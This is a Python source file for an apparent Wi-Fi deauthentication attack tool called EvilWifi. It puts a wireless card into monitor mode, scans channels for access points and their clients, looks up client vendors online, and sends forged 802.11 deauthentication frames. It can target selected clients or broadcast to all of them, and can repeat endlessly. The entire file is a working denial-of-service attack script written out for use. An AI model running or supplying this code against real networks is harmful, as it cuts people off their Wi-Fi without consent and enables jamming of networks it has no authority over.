import logging
# Tell scapy to shutup
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import subprocess
import requests

from operator import attrgetter
from scapy.all import *
from sys import exit
# Scapy we asked you to shutup
conf.verb = 0

class AccessPoint:
	def __init__(self, bssid, ssid, channel, iden):
		self.bssid = bssid
		self.ssid = ssid
		self.channel = channel
		self.iden = iden

class Client_object:
	def __init__(self, c_iden, client_bssid, selected_ap, channel, selected_ap_ssid, client_vendor):
		self.c_iden = c_iden
		self.bssid = client_bssid
		self.acces_point_bssid = selected_ap
		self.channel = channel
		self.acces_point_ssid = selected_ap_ssid
		self.deauth = False
		self.client_vendor = client_vendor

class Network_interface:
	def __init__(self, iden, interface_name):
		self.iden = iden
		self.interface_name = interface_name


def check_vendor(mac):
	url = "https://macvendors.co/api/{}".format(mac)
	try:
		r = requests.get(url)
		result = r.json()
		client_vendor = result['result']['company']
	except:
		client_vendor = 'Unknown'
	return client_vendor

def Interface_Choice():
	global interface
	global original_interface
	ClearScreen()
	print('#####')
	print('Avalaible Interface:')
	print('#####\n')
	iden = 1
	for entry in os.listdir('/sys/class/net/'):
		if 'mon' in entry:
			subprocess.check_output(['airmon-ng', 'stop', entry])

	for entry in os.listdir('/sys/class/net'):
		if entry != 'lo':
			interface_name = entry
			interface_list[entry] = Network_interface(iden, interface_name)	
			iden +=1
	interfaces_list_sorted = sorted(interface_list.values(), key=attrgetter("iden"))
	print('\t ID  | Interface Name')
	print('\t-------------------------')
	for entry in interfaces_list_sorted:
		print('\t {}   | {}'.format(entry.iden, entry.interface_name))

	try:
		choosed_interface = input('\nInterface to put in monitor mod: ')
		for entry in interface_list:
			interface = interface_list[entry]
			if int(choosed_interface) == int(interface.iden):
				original_interface = interface.interface_name
				interface = interface.interface_name
				break
	except TypeError:
		print('\n[!]Incorrect selection, please input the interface ID...')
		time.sleep(3)
		Interface_Choice()
		
	except ValueError:
		print('\n[!]Incorrect selection, please input the interface ID...')
		time.sleep(3)
		Interface_Choice()

	if 'mon' in interface:
		print('\n [+] {} allready in monitor mod, getting ready to scan ...'.format(interface))
		time.sleep(2)
	else:
		subprocess.check_output(['airmon-ng', 'start', interface])
		ClearScreen()
		print('\n[+] Setting {} to monitor mod please wait...'.format(interface))
		time.sleep(3)
		for entry in os.listdir('/sys/class/net/'):
			if 'mon' in entry:
				interface = entry
				command_run = subprocess.call(['ip', 'link', 'set', 'dev', interface, 'up'])
				if command_run != 0 :
					subprocess.call(['ifconfig', interface, 'up'])
				conf.iface = interface
				time.sleep(3)

def Scan_For_AP():
	global ap_list
	global interface
	global channel
	ClearScreen()
	print('\n[+] Scanning for access points...\n')
	for channel in channels:
		os.system('iw dev {} set channel {}'.format(interface, channel))
		sniff(iface=conf.iface, prn=ApHandler, count=10, timeout=3, store=0)
	Show_Avaible_AP()

def Show_Avaible_AP():
	global ap_list
	ClearScreen()
	if len(ap_list) > 0:
		print('#######')
		print('Acces Point found:')
		print('#######\n')
		print('\tID |       AP BSSID       |    AP SSID    ')
		print('\t---------------------------------------------------------------')
		ap_list_sorted = sorted(ap_list.values(), key=attrgetter("iden"))
		for ap in ap_list_sorted:
			if ap.iden >= 10:
				print('\t{} |  {}   |   {}'.format(ap.iden, ap.bssid, ap.ssid))
			else:
				print('\t{}  |  {}   |   {}'.format(ap.iden, ap.bssid, ap.ssid))

		Select_AP_Target()

	else:
		print('#######')
		retry = input('No Access Point found, retry ? (y/n): ')
		if retry.lower() == 'y':
			Scan_For_AP()
		else:
			exit_script()

		print('#######\n')
		exit_script()

def Select_AP_Target():
	global AP_Target
	global selected_ap
	AP_Target = input('\n[*] Please enter the identification number of the AP to attack (r for retry): ')
	if AP_Target == 'r':
		Main()
	else:	
		for ap in ap_list:
				selected_ap = ap_list[ap]
				try:
					if int(selected_ap.iden) == int(AP_Target):
						break
				except ValueError:
					print('\n[!] Incorrect input, enter the ID number of the access point !')
					time.sleep(3)
					Show_Avaible_AP()
		Scan_For_Clients()


def Scan_For_Clients():
	global selected_ap
	i = 0
	ClearScreen()
	print('\n[+] Scanning for clients on {} ...\n'.format(selected_ap.ssid))
	while i < 10:
		sniff(iface=conf.iface, prn=ClientHandler, count=10, timeout=3, store=0)
		i += 1
	Show_Avalaible_Clients()

def Show_Avalaible_Clients():
	global clients_list
	global selected_ap
	global deauth_all

	ClearScreen()
	if len(clients_list) > 0:
		print('#######')
		print('Clients found for {}:'.format(selected_ap.ssid))
		print('#######\n')
		print('\tID |       Clients        |       AP BSSID       |    AP SSID   | Clients Vendors ')
		print('\t-------------------------------------------------------------------------------------')
		clients_list_sorted = sorted(clients_list.values(), key=attrgetter("c_iden"))
		for client in clients_list_sorted:
			if client.c_iden >= 10:
				print('\t{} |  {}   |  {}   |   {}     | {}'.format(client.c_iden, client.bssid, client.acces_point_bssid, client.acces_point_ssid, client.client_vendor))
			else:
				print('\t{}  |  {}   |  {}   |  {}     | {}'.format(client.c_iden, client.bssid, client.acces_point_bssid, client.acces_point_ssid, client.client_vendor))
		print('\n')
		Select_Clients_Target()
	else:
		print('#######')
		retry = input('\n[!] No Clients found for {}, retry or deauth all (y/n/a) ?: '.format(selected_ap.ssid))
		print('#######\n')
		if retry.lower() == 'y':
			Scan_For_Clients()
		elif retry.lower() == 'n':
			exit_script()
		elif retry.lower() == 'a':
			deauth_all = True
			Deauth_Targets()

		else:
			Show_Avalaible_Clients()
def Select_Clients_Target():
	global client_Targets
	global clients_list
	global deauth_all
	deauth_all = False

	try:
		client_selection = input('\n[*] Please enter the ID of the clients to attack (comma separated, 0 for all, r for retry): ')
		if client_selection == 'r':
			ClearScreen()
			Scan_For_Clients()
		elif int(client_selection) > len(clients_list):
			raise ValueError
		else:
			if int(client_selection) == 0:
				deauth_all = True
			elif int(client_selection) < 0:
				raise ValueError
			else:
				client_selection = client_selection.split(',')
				for selected in client_selection:
					for client in clients_list:
						client = clients_list[client]
						if int(selected) == int(client.c_iden):
							client.deauth = True
	except ValueError:
		print('\n[!] Incorrect input, enter the ID(s) number(s) of the client(s) !')
		time.sleep(3)
		Show_Avalaible_Clients()
	except TypeError:
		print('\n[!] Incorrect input, enter the ID(s) number(s) of the client(s) !')
		time.sleep(3)
		Show_Avalaible_Clients()

	Deauth_Targets()


def Deauth_Targets():
	global selected_ap
	global clients_list
	global deauth_all
	global attack_length

	attack_length = input('\n [|] How many Deauth packets should we send ? (0 for infinite): ')
	try:
		if attack_length == '0':
			if deauth_all == True:
				while True:
					nuke_all()
			else:
				while True:
					deauth_clients()
		else:

			if deauth_all == True:
				for attack in range(1,int(attack_length)):
					try:
						ClearScreen()
						print('[+] {}/{} packets sent'.format(attack, attack_length))
						nuke_all()
					except KeyboardInterrupt:
						Menu()
			else:
				for attack in range(1,int(attack_length)):
					try:
						ClearScreen()
						print('[+] {}/{} packets sent'.format(attack, attack_length))
						deauth_clients()
					except KeyboardInterrupt:
						break
						Menu()
	except ValueError:
		print('\n[!] Invalid input, please enter a number ...')
		time.sleep(3)
		Deauth_Targets()
	Menu()


def deauth_clients():
	global selected_ap
	global clients_list
	for client in clients_list:
		client = clients_list[client]
		if client.deauth == True:
			packet = (RadioTap(present=0)/Dot11(type=0,subtype=12,addr1=client.bssid,addr2=selected_ap.bssid,addr3=selected_ap.bssid)/Dot11Deauth(reason=7))
			sendp(packet)

def nuke_all():
	global selected_ap
	packet = (RadioTap(present=0)/Dot11(type=0,subtype=12,addr1='ff:ff:ff:ff:ff:ff',addr2=selected_ap.bssid,addr3=selected_ap.bssid)/Dot11Deauth(reason=7))
	sendp(packet)

def ApHandler(pkt):
	global channel
	global ap_list
	global iden
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype == 8:
			if pkt.addr2 not in ap_list:
				iden += 1
				bssid = pkt.addr2
				ssid = pkt.info.decode('utf-8')
				ap_list[bssid] = AccessPoint(bssid, ssid, channel, iden)

def ClientHandler(pkt):
	global channel
	global clients_list
	global selected_ap
	global c_iden
	if pkt.haslayer(Dot11):
		if pkt.addr1 and pkt.addr2:
			if pkt.addr1 == selected_ap.bssid:
				client_bssid = pkt.addr2
				if client_bssid not in clients_list:
					c_iden +=1
					selected_ap_ssid = selected_ap.ssid
					client_vendor = check_vendor(client_bssid)
					clients_list[client_bssid] = Client_object(c_iden, client_bssid, selected_ap.bssid, channel, selected_ap_ssid, client_vendor)	
			if pkt.addr2 == selected_ap.bssid:
				client_bssid = pkt.addr1
				if client_bssid not in clients_list:
					c_iden += 1
					selected_ap_ssid = selected_ap.ssid
					client_vendor = check_vendor(client_bssid)
					clients_list[client_bssid] = Client_object(c_iden, client_bssid, selected_ap.bssid, channel, selected_ap_ssid, client_vendor)	

def ClearScreen():
	print('\n' * 200)
	print("""
	___________            __      __.__  _____.__ 
	\_   _____/__  __ ____/  \    /  \__|/ ____\__|
	 |    __)_\  \/ // __ \   \/\/   /  \   __\|  |
	 |         \   /\  ___/\        /|  ||  |  |  |
	/_______  / \_/  \___  >\__/\  / |__||__|  |__|
	        \/           \/      \/                
	________________________________________________
		\n""")

def exit_script():
	global original_interface
	global interface
	print('\n[!] Stopping monitor mod and exiting please wait....\n')
	subprocess.check_output(['airmon-ng', 'stop', interface])
	time.sleep(8)
	command_run = subprocess.call(['ip', 'link', 'set', 'dev', original_interface, 'up'])
	if command_run != 0 :
		subprocess.call(['ifconfig', original_interface, 'up'])
	exit('\nQuitting..')



def Reset():
	global ap_list
	global ap_list_sorted
	global selected_ap
	global selected_ap_ssid
	global clients_list
	global clients_list_sorted
	global client_Targets
	global client_selection
	global iden
	global c_iden
	global deauth_all

	deauth_all = False
	c_iden = 0
	iden = 0
	ap_list = {}
	ap_list_sorted = {}
	selected_ap = ''
	selected_ap_ssid = ''
	clients_list = {}
	clients_list_sorted = {}

	client_Targets = ''
	client_selection = ''


def Menu():
	global ap_list
	global ap_list_sorted
	global clients_list
	global clients_list_sorted

	ClearScreen()
	try:
		menu_choice = input("""\n 
	[|] What should we do now ? 
		[c] Continue the attack
		[s] Scan for more clients
		[a] Scan for more Access Point
		[q] Quit the script

	    Choice: """)
		if menu_choice.lower() == 'c':
			Deauth_Targets()
		elif menu_choice.lower() == 's':
			Scan_For_Clients()
		elif menu_choice.lower() == 'a':
			Reset()
			Scan_For_AP()
		elif menu_choice.lower() == 'q':
			exit_script()
		else:
			Menu()
	except KeyboardInterrupt:
		exit_script()

def First_run_menu():
	global interface
	global AP_Target
	global ap_list
	global selected_ap
	global client_Targets

	ClearScreen()
	try:
		Interface_Choice()
	except KeyboardInterrupt:
		exit('\nQuitting..')
	Scan_For_AP()

original_interface = ''
interface = ''
ap_list = {}
clients_list = {}
interface_list = {}

channels = [1,2,3,4,5,6,7,8,9,10,11]
iden = 0
c_iden = 0
AP_Target = ''
selected_ap = ''
client_Targets =''
deauth_all = False

try:
	First_run_menu()
except KeyboardInterrupt:
	Menu()
